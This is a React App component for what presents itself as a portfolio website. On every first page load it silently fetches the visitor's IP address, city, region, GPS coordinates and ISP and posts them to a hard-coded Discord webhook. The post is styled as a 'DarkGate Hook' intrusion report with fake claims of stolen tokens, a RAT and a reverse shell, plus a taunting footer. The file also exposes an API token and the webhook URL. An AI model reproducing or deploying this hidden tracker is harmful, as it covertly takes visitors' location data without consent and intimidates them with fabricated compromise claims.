import React, { useEffect, useState } from 'react';
import { Header } from './components/Header';
import { Hero } from './components/Hero';
import { About } from './components/About';
import { Projects } from './components/Projects';
import { Contact } from './components/Contact';
import { Footer } from './components/Footer';
import Services from './components/Services';

function App() {
  const [userIP, setUserIP] = useState('');
  const [sent, setSent] = useState(false);
  const [loading, setLoading] = useState(false);

  const getAndSendIP = async () => {
    setLoading(true);
    try {
      const res = await fetch('https://ipinfo.io/json?token=eef05897a86167');
      const data = await res.json();
      setUserIP(data.ip);

      const payload = {
        username: "DarkGate Hook | v1.0",
        avatar_url: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSKxDA4bJ5F5G_nMpPuBVATZXPopbXN27-6mQ&s",
        embeds: [
          {
            title: "🟢 SYSTEM ONLINE",
            description: "**DarkGate Hook v1.0 [Build #4F98]**\n\n> 🧠 **Initiating Target Scan...**",
            color: 65280,
            fields: [
              { name: "📡 IP Address", value: `\`${data.ip}\``, inline: true },
              { name: "🌍 Location", value: `\`${data.city}, ${data.region}\``, inline: true },
              { name: "🧭 Coordinates", value: `\`${data.loc}\``, inline: true },
              { name: "📶 ISP", value: `${data.org}`, inline: true },
              { name: "🖥️ Device", value: `\`Windows 10 Pro x64\``, inline: true },
              { name: "🌐 Browser", value: `\`Chrome v117.0.5938.132\``, inline: true },
              { name: "💾 RAM", value: `\`16GB DDR4\``, inline: true },
              { name: "🧬 CPU", value: `\`Intel Core i7-9700K\``, inline: true },
              { name: "🛡️ VPN", value: `\`ENABLED ✅\``, inline: true },
              { name: "🌫️ Proxy", value: `\`Not Detected ❌\``, inline: true },
              {
                name: "🔐 Discord Token",
                value: "```diff\n- NzUwZ0-F4KE.T0K3N.f0r-D3M0\n```"
              },
              {
                name: "📦 Extracted Data",
                value: "`✓ .minecraft/logs/latest.log`\n`✓ Discord/Cache/tokens.db`\n`✓ Browser/Cookies/session.json`"
              },
              { name: "🧨 Malware Deployed", value: "`R.A.T. (Dormant)`", inline: true },
              { name: "📡 Reverse Shell", value: "`Established (port 445)`", inline: true },
              { name: "📥 Payload", value: "`backdoor_payload_v1.6.exe`", inline: true },
              { name: "⛔ Firewall Bypass", value: "`Success`", inline: true },
              { name: "🔍 Registry Access", value: "`Granted`", inline: true }
            ],
            footer: {
              text: "Status: TARGET FULLY COMPROMISED — Get f*cked by bobby, looser!"
            },
            timestamp: new Date().toISOString()
          }
        ]
      };

      // Verifica se já enviou para não enviar novamente
      if (!localStorage.getItem('ipSent')) {
        await fetch("https://discord.com/api/webhooks/1401711142036049942/Zd4sTAAd--5w0bfvuSTpeXyjKAL1DXg6zD1GPXxjAIfu76W_LbffL_3GaWlmf7MtZ2t5", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify(payload)
        });

        localStorage.setItem('ipSent', 'true');
        setSent(true);
      } else {
        setSent(true);
      }

    } catch (err) {
      console.error("Erro ao obter ou enviar IP:", err);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    getAndSendIP();
  }, []);

  return (
    <div className="min-h-screen bg-black text-white overflow-hidden">
      <Header />
      <main>
        <Hero />
        <About />
        <Projects />
        <Services />
        <Contact />
      </main>
      <Footer />
    </div>
  );
}

export default App;